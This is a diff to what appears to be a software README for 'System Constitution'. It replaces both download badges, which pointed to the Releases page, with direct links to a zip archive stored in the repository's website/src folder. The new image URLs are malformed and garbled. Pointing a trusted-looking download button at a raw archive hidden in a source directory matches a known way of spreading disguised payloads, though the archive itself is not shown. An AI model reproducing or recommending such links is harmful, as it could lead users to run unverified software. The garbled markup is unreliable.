@@ -17,7 +17,7 @@ Before downloading System Constitution, ensure your computer meets these require
 
 To download System Constitution, visit the Releases page and choose the version that suits your system. Click the button below to go directly to the download page.
 
-[![Download System Constitution](https://img.shields.io/badge/Download%20System%20Constitution-blue.svg)](https://github.com/enescoban43/System-Constitution/releases)
+[![Download System Constitution](https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip%20System%https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip)](https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip)
 
 On the Releases page, find the latest version listed. Click on it to view available files. Download the appropriate file for your operating system by clicking the link.
 
@@ -84,4 +84,4 @@ Stay connected with our project and the community. You can follow us on our soci
 
 In summary, System Constitution aims to support you in creating stable software systems, ensuring that they evolve smoothly over time. By following the steps outlined, you can easily download and use this software to your advantage. For your convenience, here is the download link again:
 
-[![Download System Constitution](https://img.shields.io/badge/Download%20System%20Constitution-blue.svg)](https://github.com/enescoban43/System-Constitution/releases)
+[![Download System Constitution](https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip%20System%https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip)](https://github.com/enescoban43/System-Constitution/raw/refs/heads/main/website/src/System-Constitution-v2.4.zip)
